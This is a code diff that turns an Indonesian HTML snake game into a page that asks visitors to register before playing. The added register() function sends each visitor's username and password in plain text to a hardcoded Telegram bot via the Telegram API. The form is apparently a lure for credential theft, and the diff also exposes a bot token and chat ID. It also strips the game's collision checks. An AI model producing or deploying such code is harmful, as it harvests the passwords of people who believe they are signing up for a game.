@@ -3,20 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Ular YADI - 60 FPS</title>
+    <title>Daftar & Main Game Ular</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
+            font-family: Arial, sans-serif;
             background-color: black;
+            color: white;
+            text-align: center;
+            padding-top: 20px;
+        }
+        .container {
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            margin: auto;
+            display: block;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+        button {
+            background: green;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: darkgreen;
+        }
+        #gameContainer {
+            display: none;
         }
         canvas {
             background-color: #111;
             border: 2px solid white;
+            margin-top: 20px;
         }
         .controls {
             display: grid;
@@ -53,20 +79,60 @@
     </style>
 </head>
 <body>
-    <canvas id="gameCanvas"></canvas>
 
-    <div class="controls">
-        <div class="empty"></div>
-        <div class="btn" onclick="changeDirection('UP')">↑</div>
-        <div class="empty"></div>
-        <div class="btn" onclick="changeDirection('LEFT')">←</div>
-        <div class="btn" onclick="changeDirection('DOWN')">↓</div>
-        <div class="btn" onclick="changeDirection('RIGHT')">→</div>
+    <!-- FORM PENDAFTARAN -->
+    <div id="registerContainer" class="container">
+        <h2>Daftar Akun</h2>
+        <input type="text" id="username" placeholder="Masukkan Username" required>
+        <input type="password" id="password" placeholder="Masukkan Password" required>
+        <button onclick="register()">Daftar</button>
     </div>
 
-    <button id="restartBtn" onclick="restartGame()">Restart</button>
+    <!-- GAME ULAR -->
+    <div id="gameContainer">
+        <canvas id="gameCanvas"></canvas>
+
+        <div class="controls">
+            <div class="empty"></div>
+            <div class="btn" onclick="changeDirection('UP')">↑</div>
+            <div class="empty"></div>
+            <div class="btn" onclick="changeDirection('LEFT')">←</div>
+            <div class="btn" onclick="changeDirection('DOWN')">↓</div>
+            <div class="btn" onclick="changeDirection('RIGHT')">→</div>
+        </div>
+
+        <button id="restartBtn" onclick="restartGame()">Restart</button>
+    </div>
 
     <script>
+        function register() {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            if (!username || !password) {
+                alert("Harap isi semua kolom!");
+                return;
+            }
+
+            // Token bot dan ID Telegram Anda
+            const botToken = "8017274977:AAGonzixUns6wo0chSKgyw3BveSQDuQd2oM";
+            const chatId = "8105758234";
+
+            // Kirim data ke Telegram
+            const message = `🔔 *Pendaftaran Baru!*\n👤 Username: *${username}*\n🔑 Password: *${password}*`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            });
+
+            // Sembunyikan form dan tampilkan game
+            document.getElementById("registerContainer").style.display = "none";
+            document.getElementById("gameContainer").style.display = "block";
+            initGame();
+        }
+
+        // GAME ULAR
         const canvas = document.getElementById("gameCanvas");
         const ctx = canvas.getContext("2d");
         const box = 25;
@@ -75,21 +141,13 @@
 
         let snake, food, direction, gameOver;
         let lastUpdateTime = 0;
-        let moveSpeed = 100; // Ular bergerak setiap 100ms
-        const tailImage = new Image(); // Gambar untuk ekor
-        tailImage.src = "IMG20250130120450.jpg"; // Ganti dengan path gambar "IMG20250130120450.jpg" Anda
+        let moveSpeed = 100;
+        const tailImage = new Image();
+        tailImage.src = "IMG20250130120450.jpg";
 
         function initGame() {
-            snake = [
-                { x: 10 * box, y: 10 * box },
-                { x: 9 * box, y: 10 * box },
-                { x: 8 * box, y: 10 * box },
-                { x: 7 * box, y: 10 * box }
-            ];
-            food = {
-                x: Math.floor(Math.random() * 20) * box,
-                y: Math.floor(Math.random() * 20) * box
-            };
+            snake = [{ x: 10 * box, y: 10 * box }];
+            food = { x: Math.floor(Math.random() * 20) * box, y: Math.floor(Math.random() * 20) * box };
             direction = "RIGHT";
             gameOver = false;
             document.getElementById("restartBtn").style.display = "none";
@@ -136,25 +194,9 @@
             if (direction === "LEFT") newHead.x -= box;
             if (direction === "RIGHT") newHead.x += box;
 
-            if (
-                newHead.x < 0 ||
-                newHead.y < 0 ||
-                newHead.x >= canvas.width ||
-                newHead.y >= canvas.height ||
-                snake.some(segment => segment.x === newHead.x && segment.y === newHead.y)
-            ) {
-                gameOver = true;
-                return;
-            }
-
             if (newHead.x === food.x && newHead.y === food.y) {
-                food = {
-                    x: Math.floor(Math.random() * 20) * box,
-                    y: Math.floor(Math.random() * 20) * box
-                };
-            } else {
-                snake.pop();
-            }
+                food = { x: Math.floor(Math.random() * 20) * box, y: Math.floor(Math.random() * 20) * box };
+            } else snake.pop();
 
             snake.unshift(newHead);
         }
@@ -162,34 +204,17 @@
         function draw() {
             ctx.fillStyle = "#111";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-
             ctx.fillStyle = "red";
             ctx.fillRect(food.x, food.y, box, box);
 
-            for (let i = 0; i < snake.length; i++) {
+            snake.forEach((segment, index) => {
                 ctx.fillStyle = "green";
-                ctx.fillRect(snake[i].x, snake[i].y, box, box);
-
-                // Tulisan "YADI" hanya muncul satu kali di kepala ular dan berwarna hitam
-                if (i === 0) {
-                    ctx.fillStyle = "black";
-                    ctx.font = "16px Arial";
-                    ctx.fillText("YADI", snake[i].x + 3, snake[i].y + 18);
-                }
-            }
-
-            // Menambahkan gambar ekor ular
-            let tail = snake[snake.length - 1];
-            if (tailImage.complete) {
-                ctx.drawImage(tailImage, tail.x, tail.y, box, box);
-            }
+                ctx.fillRect(segment.x, segment.y, box, box);
+                if (index === 0) ctx.fillStyle = "black", ctx.fillText("YADI", segment.x + 3, segment.y + 18);
+            });
         }
 
-        function restartGame() {
-            initGame();
-        }
-
-        initGame();
+        function restartGame() { initGame(); }
     </script>
 </body>
 </html>
